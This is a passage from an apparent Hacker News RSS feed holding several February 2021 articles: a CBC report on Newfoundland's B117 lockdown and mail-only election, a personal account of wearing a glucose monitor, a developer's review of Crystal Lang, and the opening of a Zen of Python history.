dealing with the B117 COVID-19 variant. Some cases are outside the St. John's metro area, showing the outbreak is spreading, and leading to the suspension of in-person voting in Saturday's provincial election.<!-- --> <!-- -->1:50</span></span></span></p>  <p>Most cases, until now, have been linked to travel outside the province.</p>  <p>The province had 390 total cases of&nbsp;COVID-19 in all of 2020.&nbsp;&nbsp;&nbsp;&nbsp;</p>  <h2>Level 5 rules</h2>  <p>Fitzgerald said the discovery of the variant answered questions she had about the speed and scope of the virus's spread. Other provinces are battling the mutation, with experts in Ontario warning B117 could become the dominant strain there before April.</p>  <p>Due to the variant's contagious nature, Fitzgerald said the speed of isolation measures is critical to contain it.</p>  <p>Residents are now expected to remain inside their own homes as much as possible and restrict gatherings to no more than five people.</p>  <p>All non-essential businesses and facilities, including playgrounds, gyms, salons, cinemas, restaurants, bars, private health-care clinics, and retail stores that do not provide the essentials of life, are now closed.</p>  <p>Elective surgery and non-emergent medical treatments are&nbsp;also suspended.</p>  <p><em><strong>Watch the Government of Newfoundland and Labrador briefing:</strong></em></p>  <p><span><span><iframe src="https://www.youtube.com/embed/e68GaBbp81c" frameborder="no" title="YouTube content" allowfullscreen=""></iframe></span></span></p>  <p>"At this point, stay in your bubble," Fitzgerald said, simplifying&nbsp;the strict public health directions that Newfoundlanders and Labradorians haven't faced since last May.</p>  <p>"We're back here for a little while. I'm hopeful that we won't have to lock down like we did previously."</p>  <p>Health Minister John Haggie said vaccine rollout will continue as promptly as possible, but the timeline largely depends on delivery schedules, which have proved spotty throughout the country.</p>  <h2>Election day battered by outbreak</h2>  <p>Bruce&nbsp;Chaulk, the province's chief electoral officer, issued a media release immediately after the briefing&nbsp;that he had suspended in-person voting in all 40 districts across the province.</p>  <p>"In-person voting will not be rescheduled," said Bruce&nbsp;Chaulk&nbsp;in a statement. "The election will now shift exclusively to voting by mail."</p>  <p>The deadline to apply for mail-in special ballots has been extended to Feb. 15. Voting packages must be received by Elections NL by March 1.</p>  <p><span><figure><div><p><img loading="lazy" alt="" srcset="https://i.cbc.ca/1.5874466.1610711279!/fileImage/httpImage/image.jpg_gen/derivatives/original_300/andrew-furey-wearing-liberal-red-mask.jpg 300w,https://i.cbc.ca/1.5874466.1610711279!/fileImage/httpImage/image.jpg_gen/derivatives/original_460/andrew-furey-wearing-liberal-red-mask.jpg 460w,https://i.cbc.ca/1.5874466.1610711279!/fileImage/httpImage/image.jpg_gen/derivatives/original_620/andrew-furey-wearing-liberal-red-mask.jpg 620w,https://i.cbc.ca/1.5874466.1610711279!/fileImage/httpImage/image.jpg_gen/derivatives/original_780/andrew-furey-wearing-liberal-red-mask.jpg 780w,https://i.cbc.ca/1.5874466.1610711279!/fileImage/httpImage/image.jpg_gen/derivatives/original_1180/andrew-furey-wearing-liberal-red-mask.jpg 1180w" sizes="(max-width: 300px) 300px,(max-width: 460px) 460px,(max-width: 620px) 620px,(max-width: 780px) 780px,(max-width: 1180px) 1180px" src="https://i.cbc.ca/1.5874466.1610711279!/fileImage/httpImage/image.jpg_gen/derivatives/original_780/andrew-furey-wearing-liberal-red-mask.jpg"></p></div><figcaption>Premier Andrew Furey called the Feb. 13 election last month, and has faced rising criticism over his choice of timing.<!-- --> <!-- -->(Paul Daly)</figcaption></figure></span></p>  <p>The embattled election hasn't weathered the outbreak well,&nbsp;with poll workers resigning en masse,&nbsp;delaying election day for the province's most populated region.</p>  <p>Liberal Leader Andrew Furey, campaigning to reinstate himself in the premier's chair, has repeatedly come under fire for triggering an election prior to widespread vaccine availability.&nbsp;</p>  <p>Furey was compelled by law to call an election within a year of taking over as the head of the Liberal Party, with his deadline in August. When he dropped the writ in January, the province had a steadily low caseload.</p>  <p>As the outbreak worsened this week, Furey repeatedly defended his election timing.</p>  <p>"I haven't given much thought to the election," Furey said Friday evening, prior to Chaulk's announcement and just as news broke of B117's arrival. "I understand there are questions about the election … but we don't have the answers."</p>  <h2>Accountability ahead: opponents</h2>  <p>Fitzgerald said she has spoken with the province's chief electoral officer&nbsp;but would not disclose the advice she gave him when pressed during the briefing, saying it's not her jurisdiction.</p>  <p>Furey's opponents had been calling for an election delay this week&nbsp;and applauded the decision to move to special ballots. NDP Leader Alison Coffin expressed concern, however, that some people may face barriers&nbsp;in registering for mail-in voting by Monday.</p>  <p>"We may see some court challenges come from this," Coffin said. "What I'm more concerned about is how irresponsible Andrew Furey's actions were."</p>  <p>Progressive Conservative Leader Ches Crosbie declined an interview&nbsp;but said in a statement his party would discuss Furey's election timing "another day," saying the public health emergency is the&nbsp;priority.</p>  <p>"Our province deserves a thoughtful conversation about why it took so long for us to reach the right decision in postponing this election and how we hold our political leaders accountable," the statement read.</p>    <p>Earlier on Friday, officials reported 50 new cases of COVID-19, with the vast majority in the St. John's metro region. The province has reported&nbsp;higher-than-average new cases since Monday, when rampant community spread was first identified.</p>  <p>Thousands of people are now in isolation, including 300 health-care workers.</p>  <p><em><strong><a href="https://www.cbc.ca/news/canada/newfoundland-labrador">Read more from CBC Newfoundland and Labrador</a></strong></em></p></span></p></div></div>]]>
            </description>
            <link>https://www.cbc.ca/news/canada/newfoundland-labrador/newfoundland-labrador-election-lockdown-1.5913042</link>
            <guid isPermaLink="false">hacker-news-small-sites-26121658</guid>
            <pubDate>Sat, 13 Feb 2021 05:34:30 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[What a person without diabetes learned from 28 days with a glucose monitor]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 1 (<a href="https://news.ycombinator.com/item?id=26121447">thread link</a>) | @jseliger
<br/>
February 12, 2021 | https://www.levelshealth.com/blog/cgm-what-a-person-without-diabetes-learned-from-28-days-wearing-a-continuous-glucose-monitor | <a href="https://web.archive.org/web/*/https://www.levelshealth.com/blog/cgm-what-a-person-without-diabetes-learned-from-28-days-wearing-a-continuous-glucose-monitor">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><header id="header"></header><main id="main"><section id="content-articles" data-ani-anchor="onload"></section><section id="blog-single-content" data-ani-anchor=""><div><div><p>After scary bouts of hypoglycemia as a kid, Blake Reichmann thought he had a solid low-sugar diet. Then a CGM taught him where he could do better.</p></div><div><div><div><div data-bg="/wp-content/uploads/2020/10/bessi-profile.png"> <img src="data:image/svg+xml,%3Csvg%20xmlns=%22http://www.w3.org/2000/svg%22%20viewBox=%220%200%20210%20140%22%3E%3C/svg%3E" data-src="https://secure.gravatar.com/avatar/09b375d3b3a726e5e6486b60cc17de94?s=32&amp;d=mm&amp;f=y&amp;r=g"></div></div></div></div><div id="featured-image-single-v"> <img src="https://www.levelshealth.com/wp-content/uploads/2021/01/Patch.png" data-src="https://www.levelshealth.com/wp-content/uploads/2021/01/Patch.png" aria-label="The CGM Challenge: What a person without diabetes learned from 28 days with a continuous glucose monitor"></div><div id="single-content-content"><div><p><span>I never thought I’d have a tiny probe stuck in my arm for 28 days. I’m not diabetic or even prediabetic. But when I stumbled on the chance to wear a continuous glucose monitor (CGM) as part of a challenge partnered with Levels, I jumped on it. I’ve been conscious of blood sugar my whole life because I suffered from spells of hypoglycemia as a child.</span></p><p><span>Hypoglycemia is when your blood sugar drops below 70mg/dL. I still don’t know why it happened, but it wasn’t fun. When my glucose levels dropped too low, I’d experience cold sweats, lightheadedness, trembling hands, and an elevated heart rate. These symptoms were likely the result of my body releasing epinephrine (adrenaline) to stabilize my blood glucose.</span></p><p><span>Over the years, I started to pick up on which foods caused my blood sugar to crash. The biggest culprits were cereal for breakfast and sweet tea later in the day. Every time I ate a big bowl of cereal before school (usually Frosted Mini-Wheats or Honey Nut Cheerios), I would crash around 10:30 a.m. like clockwork. Sometimes the crashes were so bad that I thought I might pass out, so I’d call my mom to check me out of school.</span></p><p><img src="https://www.levelshealth.com/wp-content/uploads/2021/01/Blake-Reichman-Profile_Picture-200x200.jpg" data-src="https://www.levelshealth.com/wp-content/uploads/2021/01/Blake-Reichman-Profile_Picture-200x200.jpg" alt="" width="200" height="200" data-srcset="https://www.levelshealth.com/wp-content/uploads/2021/01/Blake-Reichman-Profile_Picture-200x200.jpg 200w, https://www.levelshealth.com/wp-content/uploads/2021/01/Blake-Reichman-Profile_Picture-400x400.jpg 400w, https://www.levelshealth.com/wp-content/uploads/2021/01/Blake-Reichman-Profile_Picture.jpg 512w" data-sizes="(max-width: 200px) 100vw, 200px" srcset="https://www.levelshealth.com/wp-content/uploads/2021/01/Blake-Reichman-Profile_Picture-200x200.jpg 200w, https://www.levelshealth.com/wp-content/uploads/2021/01/Blake-Reichman-Profile_Picture-400x400.jpg 400w, https://www.levelshealth.com/wp-content/uploads/2021/01/Blake-Reichman-Profile_Picture.jpg 512w"></p><p><span>Experiencing low blood sugar not only made it hard to focus but was, quite frankly, a scary experience for someone who didn’t understand what was going on. After missing a few classes from these episodes, my mom decided it was time to change my diet.</span></p><p><span>I went from eating cereal in the mornings to eggs, bacon, and fruit (berries or avocado) and cut out the sweet tea (tough to do for a boy raised in Alabama). Once I made those changes, the crashes stopped, and I had energy throughout the day.</span></p><p><span>At the time, I didn’t fully understand why the switch worked, but I did understand even at a young age that consuming a bunch of carbs and sugar wasn’t good for me. Since then, I’ve become fascinated with maintaining a healthy lifestyle and finding ways to improve my health. My curiosity for seeking ways to optimize my diet is what eventually led me to put a CGM on my arm.</span></p><h2>The Challenge</h2><p><span>I first learned about the 28-day </span><a href="https://www.wearablechallenge.com/"><span>Wearable Challenge</span></a><span> from following </span><a href="https://twitter.com/jwmares"><span>Justin Mares</span></a><span> on Twitter. I’ve followed Justin for quite a while since he knew a lot about the health-and-wellness space after founding two health food companies, </span><a href="https://www.kettleandfire.com/"><span>Kettle &amp; Fire</span></a><span> and </span><a href="https://perfectketo.com/"><span>Perfect Keto</span></a><span>.</span></p><p><span>In October, Justin shared an </span><a href="https://twitter.com/jwmares/status/1315696415213936641"><span>interesting tweet</span></a><span> about a weight-loss challenge that only required participants to track their blood glucose with a </span><a href="https://www.levelshealth.com/"><span>Levels</span></a><span> CGM. After reading the tweet, I knew this was something I had to try. Even though the challenge focused on weight loss, I enrolled immediately because I wanted to experiment with a CGM to see how my body reacts to my diet.</span></p><p><span>The challenge required me to keep my glucose levels below 120mg/dL even after a meal. For every day I went over, I’d lose $25 (talk about having skin in the game). The challenge started with a three-day grace period, so I could experiment with my diet to see how it impacted my glucose without getting penalized.</span></p><p><span>(For context, according to the</span><a href="https://www.idf.org/component/attachments/attachments.html?id=728&amp;task=download"> <span>International Diabetes Federation (IDF) guidelines</span></a><span>, your glucose values are “normal” if they stay below 140mg/dL after meals and return to pre-meal levels within two to three hours. Since this is a challenge geared towards weight loss, the upper limit was set slightly lower.)</span></p><p><b>Related article: </b><a href="https://www.levelshealth.com/blog/what-should-my-glucose-levels-be-ultimate-guide"><b>What should your glucose levels be? Here’s the ultimate guide to healthy blood sugar ranges</b></a></p><p><span>To help stay in the target range, each member of the challenge had access to a WhatsApp group chat to support each other. The group chat was a place for members to share what diet was working well, vent their frustrations when they failed, and provide a positive environment for motivation and encouragement. This aspect was less useful for me (I ended up muting it after a few days) because my goals were different. Still, I could see how much other members appreciated the accountability and support.</span></p><h2>What I Learned</h2><p><span>Overall, I found the challenge to be a learning experience filled with joyful moments of self-confirmation, times of utter disappointment, and a few surprises in between.</span></p><h3>The Good</h3><p><span>The best news was discovering that my typical breakfast of three eggs, bacon, and half an avocado drizzled in olive oil caused almost no glycemic response, nor did my afternoon snack of raw almonds. The app showed that these foods consistently hit a perfect score. Since I eat these foods most often, it was comforting knowing that I had a strong foundation.</span></p><p><img src="https://www.levelshealth.com/wp-content/uploads/2021/01/Breakfast-3.png" data-src="https://www.levelshealth.com/wp-content/uploads/2021/01/Breakfast-3.png" alt="" width="400" height="600" data-srcset="https://www.levelshealth.com/wp-content/uploads/2021/01/Breakfast-3.png 400w, https://www.levelshealth.com/wp-content/uploads/2021/01/Breakfast-3-267x400.png 267w, https://www.levelshealth.com/wp-content/uploads/2021/01/Breakfast-3-133x200.png 133w" data-sizes="(max-width: 400px) 100vw, 400px" srcset="https://www.levelshealth.com/wp-content/uploads/2021/01/Breakfast-3.png 400w, https://www.levelshealth.com/wp-content/uploads/2021/01/Breakfast-3-267x400.png 267w, https://www.levelshealth.com/wp-content/uploads/2021/01/Breakfast-3-133x200.png 133w"></p><p><span>The challenge also confirmed my belief that eating a low-carb paleo/keto-inspired diet consisting of mostly meat, vegetables, and healthy fats (olive oil, coconut oil, and butter/ghee) was optimal for maintaining consistent glucose levels.</span></p><p><img src="https://www.levelshealth.com/wp-content/uploads/2021/01/Almonds-3.png" data-src="https://www.levelshealth.com/wp-content/uploads/2021/01/Almonds-3.png" alt="" width="350" height="500" data-srcset="https://www.levelshealth.com/wp-content/uploads/2021/01/Almonds-3.png 350w, https://www.levelshealth.com/wp-content/uploads/2021/01/Almonds-3-280x400.png 280w, https://www.levelshealth.com/wp-content/uploads/2021/01/Almonds-3-140x200.png 140w" data-sizes="(max-width: 350px) 100vw, 350px" srcset="https://www.levelshealth.com/wp-content/uploads/2021/01/Almonds-3.png 350w, https://www.levelshealth.com/wp-content/uploads/2021/01/Almonds-3-280x400.png 280w, https://www.levelshealth.com/wp-content/uploads/2021/01/Almonds-3-140x200.png 140w"></p><p><span>Over the past four years, I’ve made a conscious effort to cook meals that avoid simple carbs, vegetable oils, and sweeteners, and it felt really good knowing I’d been making the right choices.</span></p><h3>The Not-So-Good</h3><p><span>The foods with the most considerable impact on my blood sugar were white rice and craft beer, although I can’t say I was surprised. Unfortunately, I love both of these things (so long Chipotle burrito bowls). It was disappointing to finally have to stare down the truth instead of continuing to live in willful ignorance.</span></p><p><img src="https://www.levelshealth.com/wp-content/uploads/2021/01/Chipotle-1.png" data-src="https://www.levelshealth.com/wp-content/uploads/2021/01/Chipotle-1.png" alt="" width="350" height="500" data-srcset="https://www.levelshealth.com/wp-content/uploads/2021/01/Chipotle-1.png 350w, https://www.levelshealth.com/wp-content/uploads/2021/01/Chipotle-1-280x400.png 280w, https://www.levelshealth.com/wp-content/uploads/2021/01/Chipotle-1-140x200.png 140w" data-sizes="(max-width: 350px) 100vw, 350px" srcset="https://www.levelshealth.com/wp-content/uploads/2021/01/Chipotle-1.png 350w, https://www.levelshealth.com/wp-content/uploads/2021/01/Chipotle-1-280x400.png 280w, https://www.levelshealth.com/wp-content/uploads/2021/01/Chipotle-1-140x200.png 140w"></p><p><span>I was also disappointed to learn how much sweet potato spikes my blood sugar. I knew sweet potatoes had a lower </span><a href="https://www.health.harvard.edu/diseases-and-conditions/glycemic-index-and-glycemic-load-for-100-foods"><span>glycemic index (GI)</span></a><span> than regular potatoes, but they still pushed me over the limit. I plan to keep them in my diet but will be more conscious about how often I eat them.</span></p><h3>The Surprising</h3><p><span>The biggest surprise of the challenge was discovering that quality tequila (G4 Reposado) had almost no effect on my blood sugar. Tequila that is 100% agave has zero carbs because of the distillation process (an average craft IPA has around 13g of carbs). Since beer is my usual go-to if I want a drink, I was happy to learn there was a healthier substitute I already enjoyed.</span></p><p><span>I also recognize I need to be careful here. Just because I didn’t experience a glucose spike doesn’t mean I didn’t have a biological response. </span><a href="https://academic.oup.com/ajcn/article/85/6/1545/4632987"><span>Research suggests</span></a><span> that alcohol decreases the liver’s ability to make new glucose, so it can trigger hypoglycemia, especially if you’re fasting or in a ketogenic state.</span></p><p><b>Related article: </b><a href="https://www.levelshealth.com/blog/alcohol-and-metabolic-fitness"><b>What does alcohol do to my glucose levels?</b></a></p><p><span>Another big surprise was discovering that my glucose levels aren’t just impacted by <em>what</em> I eat but also <em>when</em> I eat. I confirmed this because I meal prep twice a week to save time by eating the same meal multiple days in a row. (You may find that boring; I find it efficient.)</span></p><p><span>Eating the same thing for lunch and dinner on several challenge days was great for understanding how my body responds to food at different times of the day. All else being equal, my glucose spikes more after dinner than it does for lunch—sometimes by as much as 20mg/dL!</span></p><p><span>Even more surprising was noticing how little change there was from eating the same meal from day to day, but then having a large variance between lunch and dinner. I’m sure there’s a reason why, but I couldn’t tease a convincing explanation out of the data.</span></p><p><img src="https://www.levelshealth.com/wp-content/uploads/2021/01/Nov-11-1.png" data-src="https://www.levelshealth.com/wp-content/uploads/2021/01/Nov-11-1.png" alt="" width="350" height="500" data-srcset="https://www.levelshealth.com/wp-content/uploads/2021/01/Nov-11-1.png 350w, https://www.levelshealth.com/wp-content/uploads/2021/01/Nov-11-1-280x400.png 280w, https://www.levelshealth.com/wp-content/uploads/2021/01/Nov-11-1-140x200.png 140w" data-sizes="(max-width: 350px) 100vw, 350px" srcset="https://www.levelshealth.com/wp-content/uploads/2021/01/Nov-11-1.png 350w, https://www.levelshealth.com/wp-content/uploads/2021/01/Nov-11-1-280x400.png 280w, https://www.levelshealth.com/wp-content/uploads/2021/01/Nov-11-1-140x200.png 140w"></p><h2>What’s Changed</h2><p><span>Since the challenge ended, I’ve made a few adjustments to my diet. I’m not one to make radical changes (like cutting out a particular food from my diet forever), but now I’m more careful when I still want to splurge. Here are some of the changes I’ve made:</span></p><ul><li aria-level="1"><span>If I’m going to drink, I opt for quality spirits (neat or on the rocks) over craft beer or cocktails loaded with sugar.</span></li><li aria-level="1"><span>I’ve reconsidered the idea of a cheat day. I still plan on enjoying the occasional night of pizza and beer or tacos and margaritas, but a cheat day isn’t just a day. Now that I’m aware that the effects of an unhealthy meal can last for 2-3 days, I better make sure that the meal is worth it.</span></li><li aria-level="1"><span>I need to avoid any sweetened beverage, no matter how “healthy.”&nbsp; Smoothies, sweetened kombucha, and sweetened coffee wrecked my glucose levels, even though they’re often touted as healthy choices. Better to eat my sweets after a hearty meal than to drink them.</span></li><li aria-level="1"><span>I’m now more conscious of what I order when I eat out. For example, I opt for the salad at Chipotle instead of the burrito bowl. I’ve also switched to eating more sashimi instead of sushi to avoid eating as much rice.</span></li></ul><p><span>Even though the challenge only lasted 28 days, I learned more about my diet and lifestyle in those four weeks than I had from any previous blood test or book on dieting. The challenge confirmed that I already eat a healthy diet, but I need to make a few changes to ensure a healthy life for decades to come.</span></p><p><em><span>To learn more about the 28-day </span><a href="https://www.wearablechallenge.com/"><span>Wearable Challenge</span></a><span><a href="https://www.wearablechallenge.com/">, click here</a>.</span></em></p><p><em>Adapted from an original post <a href="https://lawsonblake.com/continuous-glucose-monitoring-levels-health/">here</a>.&nbsp;</em></p></div></div></div></section><section id="blog-single-content-related" data-ani-anchor=""></section></main>         </div>]]>
            </description>
            <link>https://www.levelshealth.com/blog/cgm-what-a-person-without-diabetes-learned-from-28-days-wearing-a-continuous-glucose-monitor</link>
            <guid isPermaLink="false">hacker-news-small-sites-26121447</guid>
            <pubDate>Sat, 13 Feb 2021 04:41:34 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[3 years of Crystal Lang programming: The good, the bad, the ugly]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 2 (<a href="https://news.ycombinator.com/item?id=26120995">thread link</a>) | @iomcr
<br/>
February 12, 2021 | https://anykeyh.hashnode.dev/3-years-of-crystal-lang-programming-the-good-the-bad-the-ugly | <a href="https://web.archive.org/web/*/https://anykeyh.hashnode.dev/3-years-of-crystal-lang-programming-the-good-the-bad-the-ugly">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div itemprop="text"><p><img src="https://crystal-lang.org/assets/media/crystal_logo.svg" alt="Crystal Logo"></p>
<p>It's been more than three years since I've been hooked into Crystal Lang. For
those who don't know, Crystal promises to be able to write high-level code,
borrowing syntax from Ruby while adding strongly-typed yet inferred parameters
and avoiding the null exception problem. It also provides a complete and powerful <em>stdlib</em> and uses concepts from new generation languages like Go Lang. </p>
<p>Oh, and a powerful on-compile time macro system making runtime reflection obsolete! </p>
<p>Did it fulfill its promises? Yes. At some costs.</p>
<p>I started developing in Crystal Lang out of curiosity and pleasure, as I thought
this is a fun language to work with. 
Then I challenged myself to see what I was able to write, and it ended up with <em><a target="_blank" href="https://github.com/anykeyh/clear">Clear</a></em>, an ORM I've built from scratch.</p>
<p>Eventually, I started working on a booking platform. Getting free hands on the technical side, I decided to design the backend in Crystal. </p>
<p>Nine months later and an app finished, I can give some insight about using Crystal in a professional environment; the <strong>good</strong>, the <strong>bad</strong>, and the <strong>ugly</strong>, and how to develop an app in a language that is still considered confidential and in a pre-release state.</p>
<h2 id="the-good">The good</h2>
<p>Crystal kept its promise in being a very expressive language. It allowed me to
write clean high-level business code, allowing to lower the gap between clients
requirement and code syntax. Big <em>oui</em> here!</p>
<pre><code>
post <span>"/contact_us"</span> <span>do</span> <span>|env|</span>
  form = ContactUsForm.from_json(env.request.body.not_nil!)
  Mail.deliver ContactUsEmail.new(form.email, form.title, form.message)
<span>end</span>
</code></pre>
<p>The customer had some very complex rules when bookings were moved or canceled,
and I was aware that two teams of developers had given up on this project prior
to my work. </p>
<p>I decided to go for a Controller - Business Logic - Model 3-tier on
the backend and keep the View and Presentation on the frontend (using Typescript
and MithrilJS). </p>
<p>Because Crystal is strongly typed, the work to be done on spec
and coverage of the code is strongly reduced, in comparison to a Ruby or Python
code. </p>
<p>80% of the bugs occurring in those script languages have their root cause
laying in lose parameter type or nullable type. Both cases are covered at
compile time in Crystal. Basically, I wrote only 120 test cases on this
application, covering the different business cases of the user. In Ruby, for an
application of this scale, I would be around 250 to 400 tests.</p>
<p>At release, the application faced very few bugs. 
Some edges case we forgot with the client were failing. But so far, the compiler did an excellent job in preventing most of the bugs. </p>
<p>Because the language is compiled, it is wonderful to use within a Kubernetes cluster: The app starts in less than 200ms, allowing horizontal scaling, health-check and automatic restart of the app much more convenient than a big Rails application. </p>
<p>Memory usage is relatively low, peeking to ~250Mb and I never experienced any memory leak whatsoever. </p>
<p>And it runs fast. Really fast. For those who used to work with Rails, Django, or Laravel,
we are comparing snails with a cheetah there. </p>
<p>Actually, it runs so fast that I decided to do some complex data aggregation and transformation directly in Crystal instead of PostgreSQL.</p>
<h2 id="the-bad">The bad</h2>
<p>The major challenge I faced in keeping a good pace and being productive was the
compilation time. It takes around 20 seconds to compile/run spec on my i7 8750H.
We are talking of an app with ~9000 LOC, few shards (library), for a grand total
of probably less than 100k LOC. This compilation time is mostly due to the very
dynamic nature of Crystal lang, the work needed to be done at
compile-time  (<em> macro and type inference being the culprits </em>) , and the lack of
incremental compilation at the time of writing this article. 20 seconds seems
not much, but during a whole working day, it builds-up leading to a
non-negligible loss of productivity. For the defense of the language, the
problem is also at the developer level: it is just enough to lose focus, browse
few tabs on Reddit, check a video on Youtube, and can - too often! -  snowball
to minutes or more. Guilty I am!</p>
<p>Another challenge was the usage of the young library ecosystem. The language is
still confidential and some shards  (the name which is given to libraries in the Crystal
world) are not working with the latest version of Crystal, or lack of support,
as some authors just gave up on the language or have little to no time to
maintain them. 
I can't complain, as I am too responsible for this, as I gave little maintenance the last months over <a target="_blank" href="https://github.com/anykeyh/clear">Clear ORM</a>.</p>
<h2 id="the-ugly">The ugly?</h2>
<p>During development, I faced a few but worrying bugs, where the compiler was
literally crashing without any idea of where the problem came from. It also
happens that using some complex features of the language, like inheriting from
generic classes could lead to segfault during execution after a while. Issues
were raised and the Crystal Lang team fixed everything on short notice.</p>
<p>Since now, I'm not able to build the backend using <code>--release</code> flag due to
segfault at compile time. 
This is not a problem <em>per se</em>, as even without the optimization, the backend spends like 90% of its time waiting for PostgreSQL. </p>
<p>I still get a random crash of the application I gave up fixing for now.
Basically, the app can't access anymore to the PostgreSQL database after a
while.
This occurs on average between 3 to 30 days of running; I defined an
<code>/healthcheck</code> endpoint throwing a simple <code>SELECT 1</code>; to check the connection, called each second by Kubernetes.</p>
<p>With multiple pods redundancy, and thanks to low
memory foot-print and quick start-up time, pods defaulted got evicted and
recreated in a matter of seconds.</p>
<h2 id="conclusion">Conclusion</h2>
<p><strong>If I did this app using Rails, would have I been more productive?</strong></p>
<p>It's hard to say, as I spent quite a lot of time debugging, improving, and
maintaining Clear ORM within the scope of this project. I think the
productivity difference would have been negligible.</p>
<p>What you would win by having a strict compiler avoiding your hours of debugging 
and specs definition, you lose by the compile-time, the need to rewrite some 
basic functionality you could get via gems. </p>
<p><strong>Would I recommend people using Crystal?</strong></p>
<p>Yes, if:</p>
<ul>
<li>You are aware that something might break, as the ecosystem is still young.</li>
</ul>
<p>Avoiding monolithic application patterns will certainly reduce the compile-time
problems. Having micro-service architecture is a must-have if you want to
develop with Crystal, as each service will take much less time to compile, test
and deploy. </p>
<p>The low memory footprint and fast execution time fit perfectly with
this architecture. If you come from the Ruby world, you will feel at ease with
the syntax but will have to learn new design patterns of face issues with
compile-time or overly complex macro/code.
A common mistake is to try to use open hash, JSON, or collection to realize too late that strongly typed language doesn't like open structures</p>
<p><strong>Compared to Go Lang or Rust, how do Crystal fits?</strong> </p>
<p>Go Lang is very dull and <em>feels</em> austere in my opinion. It's not a bad
technology, but it feels not enough magical for my personal taste.
Rust is great but it remains less elegant to write business code with it. 
The magic Rust does with the memory still adds a burden in terms of readability,
with reference, lifecycle, and other symbols polluting the essence of the code
in my opinion. </p>
<p>Knowing that the Crystal Lang team is aware of most of the
problems above and working hard to release the v1.0 of the language, I'm
confident the language will know a bright future and all the traction it merits.</p>
</div></div>]]>
            </description>
            <link>https://anykeyh.hashnode.dev/3-years-of-crystal-lang-programming-the-good-the-bad-the-ugly</link>
            <guid isPermaLink="false">hacker-news-small-sites-26120995</guid>
            <pubDate>Sat, 13 Feb 2021 02:56:54 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[The Zen of Python: A Most in Depth Article]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26120869">thread link</a>) | @lumpa
<br/>
February 12, 2021 | https://www.pythonkitchen.com/zen-of-python-in-depth/ | <a href="https://web.archive.org/web/*/https://www.pythonkitchen.com/zen-of-python-in-depth/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
			<p>Note: <em>I wrote a quite complete article on the Zen but for some reason it went down in seo history. I am tired seeing people write ‘in-depth’ article with commentaries from the top of their head and materials they pulled out of their pockets. I’m publishing the article in here.  The commentary part is built from the sayings of Brett Cannon, Guido, Chris Angelico, Nick Coghlan, Raymond Hettinger &amp; co. Warning: read only if you are a fan of Python. Last notes: I do hope learners will get a great glimpse of how the Zen can help them structure their code and give them better insight and foresight. It’s a documentation  of how practically the Zen is applied in Python decisions.</em></p>
<h2>Table of contents</h2>
<ul>
<li>Birth of the Path</li>
<li>Zen, Strunk and White</li>
<li>Master Tim Showers his Blessings</li>
<li>Authentic Commentary</li>
</ul>
<p>The Zen of Python saw light for the first time in 1999. It’s one of the many aspects that adds to the awesomeness of Python. It’s a set of expressions which corners the spirit of the language. It was enounced by Tim Peters, a reputable software engineer, master Pythonista and Python’s ‘most prolific and tenacious core developer’ in the words of none other than Guido [18]. This article bases itself mostly on the saying of core devs and highly reputable members. It makes a great gift to all those interested in the history of the sysadmin script which took the world by (pleasent) surprise.</p>
<p><img src="https://images.unsplash.com/photo-1598545343242-89b4c263a343?ixlib=rb-1.2.1&amp;ixid=eyJhcHBfaWQiOjEyMDd9&amp;auto=format&amp;fit=crop&amp;w=750&amp;q=80" alt="" data-old-src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%200%200'%3E%3C/svg%3E"></p>

<p>The way the Zen came about was unique. It was a reflection from the unknown Patrick Phalen about the Python feel [1]:</p>
<blockquote><p>
  … the more I use<br>
  and learn about the language, the more I find myself appreciating the<br>
  nice balance and heft Guido gave to it. Yet there doesn’t seem to be a<br>
  single document that sums up that “aesthetic,” but rather it<br>
  tends to appear piecemeal, over time, mostly in the Wisdom of Chairman Tim.
</p></blockquote>
<p>It was a call to infuse the Python spirit into aliens from Perl Land and beyond. It requested some 10 to 20 lines which sums up the Python view</p>
<blockquote><p>
  Would both Guido and TIm Peters be willing to collaborate on a short<br>
  paper — call it “The Python Way” for lack of a better title — which<br>
  sets out the 10-20 prescriptives they might offer to those who come to<br>
  Python from other languages and immediately want to find a way to bend<br>
  it into uncomfortable positions — (implement closures, etc.).
</p></blockquote>
<p>It was a request to prevent Pythonistas from falling into the error of campaigning for changing the language. It advocated for imbuing yourself with the language’s flow and change your ways and views instead of the other way round. In the original mail, it quoted Fredrik Lundh as saying “sure looks like the ‘community’ thinks that changing the<br>
language is more important that using it…” [5]. Patrick clarifies:</p>
<blockquote><p>
  What I have in mind is sort of a very brief Strunk-&amp;-White-like<br>
  “Elements of Style” for Python, which suggests fundamental idiomatic<br>
  recommendations for operating within the spirit of the language. A<br>
  distillation of Python Zen is what I’m talking about — something to go<br>
  off and contemplate when the “fix Python now” decibels become a bit<br>
  much.
</p></blockquote>
<p><img src="https://images.unsplash.com/photo-1555573989-14a9017746c3?ixlib=rb-1.2.1&amp;ixid=eyJhcHBfaWQiOjEyMDd9&amp;auto=format&amp;fit=crop&amp;w=749&amp;q=80" alt="" data-old-src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%200%200'%3E%3C/svg%3E"></p>

<p>The Zen school lays out hints and guidelines. You understand by your own exercise and by the company of someone seasoned in the craft</p>
<blockquote><p>
  it de-emphasizes mere knowledge of sutras and doctrine and favors direct understanding through spiritual practice and interaction with an accomplished teacher or Master.[2]
</p></blockquote>
<p>The Zen was a request to help Python people achieve the Python state of mind so that your code resonates well with the structure behind, conveying in the process the associated beauty, elegance and finesse. Those guidelines if well impregnated would make your code revered whithin the circle of true monks.</p>
<p>But, curiously enough, Tim tells [19]:</p>
<blockquote><p>
  If I were to change anything, I’d drop the reference to “Zen”.  That wasn’t<br>
  part of the original, and was added by someone else.
</p></blockquote>
<p>In other words, the title is not from the author [23]</p>
